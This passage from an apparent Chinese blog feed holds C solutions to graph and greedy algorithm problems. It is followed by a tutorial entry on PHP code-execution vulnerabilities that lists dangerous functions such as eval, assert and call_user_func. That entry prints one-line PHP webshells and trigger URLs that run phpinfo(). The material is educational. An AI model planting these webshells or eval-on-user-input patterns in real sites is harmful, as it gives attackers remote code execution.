class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> i,j;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">        d[i] = INF;</div><div class="line">    <span class="built_in">memset</span>(used, <span class="literal">false</span>, <span class="keyword">sizeof</span>(<span class="keyword">bool</span>) * (n+<span class="number">1</span>));</div><div class="line">    d[s] = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</div><div class="line">        <span class="keyword">int</span> v = <span class="number">-1</span>;</div><div class="line">        <span class="keyword">int</span> u;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (u = <span class="number">1</span>; u &lt;= n; u++)</div><div class="line">            <span class="keyword">if</span> ( !used[u] &amp;&amp; ( v == <span class="number">-1</span> || d[u] &lt; d[v]))</div><div class="line">                v = u;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (v == <span class="number">-1</span>)</div><div class="line">            <span class="keyword">break</span>;</div><div class="line"></div><div class="line">        used[v] = <span class="literal">true</span>;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (u = <span class="number">1</span>; u &lt;= n; u++)</div><div class="line">            d[u] = min( d[u], d[v] + cost[v][u]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,d[n]);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</div><div class="line">    <span class="keyword">return</span> a&gt;b?b:a;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1078"><a href="#1078" class="headerlink" title="1078"></a>1078</h2><h3 id="思路-11"><a href="#思路-11" class="headerlink" title="思路"></a>思路</h3><p>任意两点间的最短路径问题的变体吧。一旦找出了从某个源点（人）到其他所有人需要的层数时，记录下来，如果有的人与其他所有人都不认识，则该层数是 无穷大（INF）。之后通过循环，找出从每个源点出发所需要的层数，并取最大值。要注意的是 算法求得最短路径 是 经过了几条路径（路径权为 1 ，路径权和即有几条路径），而题目的 层数M 是指 两个人之间还有多少人，即经过了多少个 点， 所以在最后的结果中记得减一。</p>
<h3 id="提交-15"><a href="#提交-15" class="headerlink" title="提交"></a>提交</h3><h4 id="dijkstra算法"><a href="#dijkstra算法" class="headerlink" title="dijkstra算法"></a>dijkstra算法</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 100</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0xfffff</span></div><div class="line"></div><div class="line"><span class="keyword">int</span> cost[MAXN+<span class="number">2</span>][MAXN+<span class="number">2</span>]; <span class="comment">//  保存 图 （各权值）</span></div><div class="line"><span class="keyword">int</span> n; <span class="comment">// 顶点数</span></div><div class="line"><span class="keyword">int</span> d[MAXN]; <span class="comment">// 从初始点出发 的最短距离</span></div><div class="line"><span class="keyword">bool</span> used[MAXN]; <span class="comment">// 已经使用过的图</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> i, j;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= n; j++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;cost[i][j]);</div><div class="line"></div><div class="line">    dijkstra(<span class="number">1</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> i,j;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">        d[i] = INF;</div><div class="line">    <span class="built_in">memset</span>(used, <span class="literal">false</span>, <span class="keyword">sizeof</span>(<span class="keyword">bool</span>) * (n+<span class="number">1</span>));</div><div class="line">    d[s] = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</div><div class="line">        <span class="keyword">int</span> v = <span class="number">-1</span>;</div><div class="line">        <span class="keyword">int</span> u;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (u = <span class="number">1</span>; u &lt;= n; u++)</div><div class="line">            <span class="keyword">if</span> ( !used[u] &amp;&amp; ( v == <span class="number">-1</span> || d[u] &lt; d[v]))</div><div class="line">                v = u;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (v == <span class="number">-1</span>)</div><div class="line">            <span class="keyword">break</span>;</div><div class="line"></div><div class="line">        used[v] = <span class="literal">true</span>;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (u = <span class="number">1</span>; u &lt;= n; u++)</div><div class="line">            d[u] = min( d[u], d[v] + cost[v][u]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,d[n]);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</div><div class="line">    <span class="keyword">return</span> a&gt;b?b:a;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="Floyd-Warshall-算法"><a href="#Floyd-Warshall-算法" class="headerlink" title="Floyd-Warshall 算法"></a>Floyd-Warshall 算法</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 102</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0xfffff</span></div><div class="line"><span class="keyword">int</span> G[MAX][MAX];</div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">warshall_floyd</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> i, j;</div><div class="line">    <span class="keyword">int</span> M = <span class="number">0</span>;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= n; j++)&#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;G[i][j]);</div><div class="line">            <span class="keyword">if</span> ( G[i][j] == <span class="number">0</span>)</div><div class="line">                G[i][j] = INF;</div><div class="line">            <span class="keyword">if</span>  ( i == j )</div><div class="line">                G[i][j] = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line"></div><div class="line">    warshall_floyd();</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= n; j++)</div><div class="line">            M = max(M, G[i][j]);</div><div class="line">    <span class="keyword">if</span> ( M  == INF)</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d"</span>,<span class="number">-1</span>);</div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, M<span class="number">-1</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">warshall_floyd</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> k, i, j;</div><div class="line">    <span class="keyword">for</span> (k = <span class="number">1</span>; k &lt;= n; k++)</div><div class="line">        <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">            <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= n; j++)</div><div class="line">                G[i][j] = min(G[i][j], G[i][k] + G[k][j]);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</div><div class="line">    <span class="keyword">return</span> a &gt; b ? b : a;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</div><div class="line">    <span class="keyword">return</span> a &gt; b ? a : b;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1316"><a href="#1316" class="headerlink" title="1316"></a>1316</h2><h3 id="想法-4"><a href="#想法-4" class="headerlink" title="想法"></a>想法</h3><p>贪心算法。背包问题。有别于0/1背包问题。<br>每次选取尽量多的单位价值高的物体。</p>
<h3 id="提交-16"><a href="#提交-16" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> unit&#123;</div><div class="line">    <span class="keyword">double</span> unitValue;</div><div class="line">    <span class="keyword">int</span> id;</div><div class="line">    <span class="keyword">double</span> weight;</div><div class="line">    <span class="keyword">double</span> value;</div><div class="line">&#125;unit;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(unit s[], <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">double</span> m,n;</div><div class="line">    <span class="keyword">static</span> unit valuesor[<span class="number">100010</span>];</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%lf%lf"</span>,&amp;m,&amp;n);</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%lf%lf"</span>,&amp;valuesor[i].weight,&amp;valuesor[i].value);</div><div class="line">        valuesor[i].unitValue = (<span class="keyword">double</span>)valuesor[i].value / (<span class="keyword">double</span>)valuesor[i].weight;</div><div class="line">        valuesor[i].id = i;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    quick_sort(valuesor,<span class="number">1</span>,n);</div><div class="line"></div><div class="line">    <span class="keyword">double</span> remainSpace = m;</div><div class="line">    <span class="keyword">double</span> allValue = <span class="number">0</span>;</div><div class="line">    i = <span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n ; i++)&#123;</div><div class="line">        <span class="keyword">if</span> (remainSpace &lt;= <span class="number">0</span>)</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">if</span> (valuesor[i].weight &lt;= remainSpace)&#123;</div><div class="line">            remainSpace = remainSpace - valuesor[i].weight;</div><div class="line">            allValue += valuesor[i].value;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            allValue += remainSpace *valuesor[i].unitValue;</div><div class="line">            remainSpace = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%lf\n"</span>,allValue);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(unit s[], <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (l &lt; r)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">int</span> i = l, j = r;</div><div class="line">        unit x = s[l];</div><div class="line"></div><div class="line">        <span class="keyword">while</span> (i &lt; j)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">while</span>(i &lt; j &amp;&amp; s[j].unitValue &lt;= x.unitValue)</div><div class="line">                j--;</div><div class="line">            <span class="keyword">if</span>(i &lt; j)&#123;</div><div class="line">                s[i].unitValue = s[j].unitValue;</div><div class="line">                s[i].id = s[j].id;</div><div class="line">                s[i].value = s[j].value;</div><div class="line">                s[i].weight = s[j].weight;</div><div class="line">                i++;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">while</span>(i &lt; j &amp;&amp; s[i].unitValue &gt;= x.unitValue)</div><div class="line">                i++;</div><div class="line">            <span class="keyword">if</span>(i &lt; j)&#123;</div><div class="line">                s[j].unitValue = s[i].unitValue;</div><div class="line">                s[j].id = s[i].id;</div><div class="line">                s[j].value = s[i].value;</div><div class="line">                s[j].weight = s[i].weight;</div><div class="line">                j--;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        s[i].id = x.id;</div><div class="line">        s[i].unitValue = x.unitValue;</div><div class="line">        s[i].value = x.value;</div><div class="line">        s[i].weight = x.weight;</div><div class="line">        quick_sort(s, l, i - <span class="number">1</span>);</div><div class="line">        quick_sort(s, i + <span class="number">1</span>, r);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近更新日期：2017-06-21&lt;br&gt;干脆把自己平日做的题放在一篇文章里吧。不然太分散了。&lt;br&gt;POJ: 1163 1258 1273 1979 2387 2388 3069 3176 3253 3617&lt;br&gt;XOJ: 1004 1005 1022 1061 1062 1075 1078 1316&lt;br&gt;
    
    </summary>
    
      <category term="编程练习" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0/"/>
    
    
      <category term="编程练习" scheme="http://yoursite.com/tags/%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0/"/>
    
      <category term="算法" scheme="http://yoursite.com/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="ACM" scheme="http://yoursite.com/tags/ACM/"/>
    
  </entry>
  
  <entry>
    <title>php代码执行漏洞</title>
    <link href="http://yoursite.com/2017/07/26/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2017/07/26/php代码执行漏洞/</id>
    <published>2017-07-26T07:49:44.000Z</published>
    <updated>2017-07-26T10:42:01.910Z</updated>
    
    <content type="html"><![CDATA[<p>php代码执行漏洞<br><a id="more"></a></p>
<h1 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h1><h2 id="php代码执行相关"><a href="#php代码执行相关" class="headerlink" title="php代码执行相关"></a>php代码执行相关</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mixed eval ( string $code )</div></pre></td></tr></table></figure>
<p>把字符串<code>code</code>作为php代码执行。常见的一句话木马：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">eval</span>($_GET[<span class="string">'pass'</span>])</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://xxx/codeexec.php?pass=phpinfo();</div></pre></td></tr></table></figure></p>
<p>得到phpinfo()页面。</p>
<h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h3><p>PHP 5<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bool assert ( mixed $assertion [, string $description ] )</div></pre></td></tr></table></figure></p>
<p>PHP 7<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bool assert ( mixed $assertion [, Throwable $exception ] )</div></pre></td></tr></table></figure></p>
<p>assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的响应。如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</p>
<p>一句话木马：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	assert($_GET[<span class="string">'pass'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://xxx/codeexec.php?pass=phpinfo()</div></pre></td></tr></table></figure></p>
<p>phpinfo()后可以不用分号。得到phpinfo()页面。</p>
<h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</div></pre></td></tr></table></figure>
<p>搜索subject中匹配pattern的部分， 以replacement进行替换。当使用被弃用的 e 修饰符时, 这个函数会转义一些字符，在完成替换后，引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串<br>更详细的说明见：<a href="http://php.net/preg_replace" target="_blank" rel="external">php-preg_replace</a></p>
<h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] )</div></pre></td></tr></table></figure>
<p>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。 传入call_user_func()的参数不能为引用传递。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	call_user_func($_GET[<span class="string">'chybeta'</span>],$_GET[<span class="string">'ph0en1x'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:2500/codeexec.php?chybeta=assert&amp;ph0en1x=phpinfo()</div></pre></td></tr></table></figure></p>
<h3 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mixed call_user_func_array ( callable $callback , array $param_arr )</div></pre></td></tr></table></figure>
<p>把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	call_user_func_array($_GET[<span class="string">'chybeta'</span>],$_GET[<span class="string">'ph0en1x'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:2500/codeexec.php?chybeta=assert&amp;ph0en1x[]=phpinfo()</div></pre></td></tr></table></figure></p>
<h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">string create_function ( string $args , string $code )</div></pre></td></tr></table></figure>
<p>该函数的内部实现用到了<code>eval</code>，所以也具有相同的安全问题。第一个参数<code>args</code>是后面定义函数的参数，第二个参数是函数的代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$a = $_GET[<span class="string">'chybeta'</span>];</div><div class="line">	$b = create_function(<span class="string">'$a'</span>,<span class="string">"echo $a"</span>);</div><div class="line">	$b(<span class="string">''</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost:2500/codeexec.php</div><div class="line">?chybeta=phpinfo();</div></pre></td></tr></table></figure></p>
<h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">array array_map ( callable $callback , array $array1 [, array $... ] )</div></pre></td></tr></table></figure>
<p>作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$array = <span class="keyword">array</span>(<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</div><div class="line">	array_map($_GET[<span class="string">'chybeta'</span>],$array);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost:2500/codeexec.php</div><div class="line">?chybeta=phpinfo</div></pre></td></tr></table></figure></p>
<p>注意没有括号<code>()</code>和分号<code>;</code>。</p>
<h2 id="系统命令执行相关"><a href="#系统命令执行相关" class="headerlink" title="系统命令执行相关"></a>系统命令执行相关</h2><h3 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h3><h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h3><h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><h3 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h3><h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h3><h3 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h3><h3 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h3><h3 id="反单引号"><a href="#反单引号" class="headerlink" title="`(反单引号)"></a>`(反单引号)</h3><h3 id="ob-start"><a href="#ob-start" class="headerlink" title="ob_start()"></a>ob_start()</h3><h3 id="escapeshellcmd"><a href="#escapeshellcmd" class="headerlink" title="escapeshellcmd()"></a>escapeshellcmd()</h3><p>该函数用于过滤</p>
<h1 id="php-mail"><a href="#php-mail" class="headerlink" title="php mail()"></a>php mail()</h1><h1 id="动态函数调用"><a href="#动态函数调用" class="headerlink" title="动态函数调用"></a>动态函数调用</h1><h1 id="反序列化问题"><a href="#反序列化问题" class="headerlink" title="反序列化问题"></a>反序列化问题</h1><h1 id="LD-PRELOAD绕过"><a href="#LD-PRELOAD绕过" class="headerlink" title="LD_PRELOAD绕过"></a>LD_PRELOAD绕过</h1><h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
<li><a href="http://php-security.org/2010/05/20/mops-submission-07-our-dynamic-php/index.html" target="_blank" rel="external">Obvious and not so obvious PHP code injection and evaluation</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;php代码执行漏洞&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
